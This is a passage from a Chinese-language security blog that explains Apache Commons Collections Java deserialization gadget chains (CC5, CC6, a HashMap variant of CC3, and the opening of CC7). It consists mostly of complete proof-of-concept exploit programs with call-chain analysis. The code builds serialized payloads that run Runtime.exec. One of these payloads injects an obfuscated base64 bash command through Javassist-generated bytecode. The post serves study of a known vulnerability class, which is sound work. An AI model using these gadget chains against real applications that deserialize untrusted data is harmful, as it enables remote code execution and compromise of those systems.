CannotCompileException, IOException </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(String.valueOf(AbstractTranslet.class));</span><br><span class="line">        CtClass ctClass = pool.get(test.class.getName());<span class="comment">//新建一个test类，没啥用</span></span><br><span class="line">        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        String code = <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,Li90ZXN0LnNo&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&#125;&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertAfter(code);</span><br><span class="line">        ctClass.setName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        TemplatesImpl tempIm = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setField(tempIm, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;asd&quot;</span>);</span><br><span class="line">        setField(tempIm, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setField(tempIm, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        InvokerTransformer invTransf = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        LazyMap map = (LazyMap)LazyMap.decorate(innermap,invTransf);</span><br><span class="line">        <span class="comment">//调用Get方法</span></span><br><span class="line">        TiedMapEntry tiedmap = <span class="keyword">new</span> TiedMapEntry(map,tempIm);</span><br><span class="line">        BadAttributeValueExpException poc = <span class="keyword">new</span> BadAttributeValueExpException(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//BadAttributeValueExpException poc = new BadAttributeValueExpException(tiedmap);</span></span><br><span class="line">        setField(poc,<span class="string">&quot;val&quot;</span>,tiedmap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc5&quot;</span>));</span><br><span class="line">            outputStream.writeObject(poc);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc5&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h1 id="六、CC6"   >
          <a href="#六、CC6" class="heading-link"><i class="fas fa-link"></i></a><a href="#六、CC6" class="headerlink" title="六、CC6"></a>六、CC6</h1>
      
        <h2 id="JAVA源码版本-8u40-5"   >
          <a href="#JAVA源码版本-8u40-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA源码版本-8u40-5" class="headerlink" title="JAVA源码版本-8u40"></a>JAVA源码版本-8u40</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171443518.png" alt="image-20220801171443518"></p>
<p>细节如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject()</span><br><span class="line">HashMap.put()-&gt;hash()</span><br><span class="line">TiedMapEntry.hashCode()-&gt;this.getValue()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br></pre></td></tr></table></div></figure>


        <h2 id="限制-5"   >
          <a href="#限制-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#限制-5" class="headerlink" title="限制"></a>限制</h2>
      <p><code>JDK</code>版本：暂无限制</p>

        <h2 id="Poc"   >
          <a href="#Poc" class="heading-link"><i class="fas fa-link"></i></a><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC6</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;./test.sh&quot;</span>&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedmap = <span class="keyword">new</span> TiedMapEntry(map,<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        HashSet hashset = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        hashset.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field = Class.forName(<span class="string">&quot;java.util.HashSet&quot;</span>).getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap hashset_map = (HashMap) field.get(hashset);</span><br><span class="line"></span><br><span class="line">        Field table = Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] array = (Object[])table.get(hashset_map);</span><br><span class="line"></span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field key = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        key.set(node,tiedmap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc6&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hashset);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc6&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="解析-7"   >
          <a href="#解析-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析-7" class="headerlink" title="解析"></a>解析</h2>
      
        <h3 id="HashSet-readObject"   >
          <a href="#HashSet-readObject" class="heading-link"><i class="fas fa-link"></i></a><a href="#HashSet-readObject" class="headerlink" title="HashSet.readObject()"></a><code>HashSet.readObject()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171648405.png" alt="image-20220801171648405"></p>
<p>这个<code>map</code>即设置为<code>HashMap</code></p>

        <h3 id="HashMap-put"   >
          <a href="#HashMap-put" class="heading-link"><i class="fas fa-link"></i></a><a href="#HashMap-put" class="headerlink" title="HashMap.put()"></a><code>HashMap.put()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171743740.png" alt="image-20220801171743740"></p>
<p>这个<code>key</code>后续设置为<code>TiedMapEntry</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171856068.png" alt="image-20220801171856068"></p>

        <h3 id="TiedMapEntry-hashCode"   >
          <a href="#TiedMapEntry-hashCode" class="heading-link"><i class="fas fa-link"></i></a><a href="#TiedMapEntry-hashCode" class="headerlink" title="TiedMapEntry.hashCode()"></a><code>TiedMapEntry.hashCode()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171928099.png" alt="image-20220801171928099"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171953683.png" alt="image-20220801171953683"></p>
<p>这里的<code>map</code>即设置为<code>Lazymap</code></p>

        <h3 id="LazyMap-get-2"   >
          <a href="#LazyMap-get-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#LazyMap-get-2" class="headerlink" title="LazyMap.get()"></a><code>LazyMap.get()</code></h3>
      <p>还是经典的链子<code>CIR</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110714702.png" alt="image-20220801110714702"></p>

        <h2 id="🔺注-1"   >
          <a href="#🔺注-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注-1" class="headerlink" title="🔺注"></a>🔺注</h2>
      
        <h3 id="1-Hashset设置"   >
          <a href="#1-Hashset设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Hashset设置" class="headerlink" title="1.Hashset设置"></a>1.<code>Hashset</code>设置</h3>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HashSet hashset = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加至少一个元素，方便后续获取</span></span><br><span class="line">hashset.add(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">Field field = Class.forName(<span class="string">&quot;java.util.HashSet&quot;</span>).getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">HashMap hashset_map = (HashMap) field.get(hashset);</span><br></pre></td></tr></table></div></figure>

<p>获取<code>HashSet</code>的<code>map</code>成员为<code>hashset_map</code></p>

        <h3 id="2-HashMap设置"   >
          <a href="#2-HashMap设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-HashMap设置" class="headerlink" title="2.HashMap设置"></a>2.<code>HashMap</code>设置</h3>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取HashMap中的table,用来获取HashMap中保存的元素</span></span><br><span class="line"><span class="comment">//transient Node&lt;K,V&gt;[] table;</span></span><br><span class="line">Field table = Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">table.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取array为HashSet的成员map中保存的元素数组</span></span><br><span class="line">Object[] array = (Object[])table.get(hashset_map);</span><br><span class="line"><span class="comment">//获取node为保存在hashset中的元素,其类为一个hashmap</span></span><br><span class="line">Object node = array[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">    node = array[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置hashset中的一个元素hashmap的key为TiedMapEntry</span></span><br><span class="line">Field key = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">key.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">key.set(node,tiedmap);</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-writeObject和readObject的关系"   >
          <a href="#3-writeObject和readObject的关系" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-writeObject和readObject的关系" class="headerlink" title="3.writeObject和readObject的关系"></a>3.<code>writeObject</code>和<code>readObject</code>的关系</h3>
      <p>在<code>HashSet</code>的<code>readObject</code>中可以看到，<code>//..</code>为省略的代码部分</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> capacity = s.readInt();</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">    <span class="keyword">float</span> loadFactor = s.readFloat();</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">    <span class="keyword">int</span> size = s.readInt();</span><br><span class="line">	<span class="comment">//.......</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        E e = (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>按理说，调用<code>map.put</code>，其函数如下，我们需要控制<code>e</code>(即下面的<code>key</code>)为<code>TiedMapEntry</code>才能调用到<code>TiedMapEntry.hashCode</code></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>但是<code>E e = (E) s.readObject();</code>，也就是得看对应的<code>HashSet.writeObject</code>中将什么序列化了</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException </span>&#123;</span><br><span class="line">    <span class="comment">// Write out any hidden serialization magic</span></span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out HashMap capacity and load factor</span></span><br><span class="line">    s.writeInt(map.capacity());</span><br><span class="line">    s.writeFloat(map.loadFactor());</span><br><span class="line">    s.writeInt(map.size());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (E e : map.keySet())</span><br><span class="line">        s.writeObject(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>可以看到，对应的写入<code>map</code>成员的<code>capacity</code>、<code>loadFactor</code>、<code>size</code>以及其中的所有元素，同时在<code>readObject</code>也是依照顺序一一对应进行读取，如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801175923980.png" alt="image-20220801175923980"></p>
<p>所以在<code>writeObject</code>的时候，在<code>HashSet</code>中的<code>map</code>成员的元素可控，那么在<code>readObject</code>的时候，对应的元素也是可控的，可以设置为<code>TiedMapEntry</code>。</p>
<p>所以在<code>JAVA</code>中的<code>writeObject</code>和<code>readObject</code>是一一对应的，写入什么格式数据，就会依照什么格式数据读取。</p>

        <h2 id="CC3的HashMap版本"   >
          <a href="#CC3的HashMap版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#CC3的HashMap版本" class="headerlink" title="CC3的HashMap版本"></a>CC3的HashMap版本</h2>
      <p>这边顺带提一下以下这两条链子，其实都差不多，大同小异，主要是前面的不太一样，直接借用<code>HashMap</code>来进行触发。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806174412815.png" alt="image-20220806174412815"></p>

        <h3 id="POC-5"   >
          <a href="#POC-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC-5" class="headerlink" title="POC"></a>POC</h3>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC3_O</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                                   <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;touch ddd&quot;</span>&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap hashmap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        hashmap.put(<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        hashmap.put(<span class="string">&quot;ccc&quot;</span>,<span class="string">&quot;ddd&quot;</span>);</span><br><span class="line">        LazyMap map = (LazyMap)LazyMap.decorate(hashmap,chain);</span><br><span class="line">        TiedMapEntry tiedmap = <span class="keyword">new</span> TiedMapEntry(map,<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        Field table = Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] array = (Object[])table.get(hashmap);</span><br><span class="line"></span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        setField(node,<span class="string">&quot;key&quot;</span>,tiedmap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc3_o&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hashmap);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc3_o&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>也没啥好说的，往<code>HashMap</code>中放两个元素，使其<code>table</code>不为空，方便取出<code>node</code>来设置<code>TiedMapEntry</code>即可。</p>
<p>其他的就相当于去掉了<code>HashSet</code>的<code>CC6</code>了，触发点在<code>HashMap.readObject()</code>下的计算<code>hash</code>的地方</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806175025930.png" alt="image-20220806175025930"></p>

        <h1 id="七、CC7"   >
          <a href="#七、CC7" class="heading-link"><i class="fas fa-link"></i></a><a href="#七、CC7" class="headerlink" title="七、CC7"></a>七、CC7</h1>
      
        <h2 id="JAVA源码版本-8u40-6"   >
          <a href="#JAVA源码版本-8u40-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA源码版本-8u40-6" class="headerlink" title="JAVA源码版本-8u40"></a>JAVA源码版本-8u40</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802153315688.png" alt="image-20220802153315688"></p>
<p>细节如下：</p>
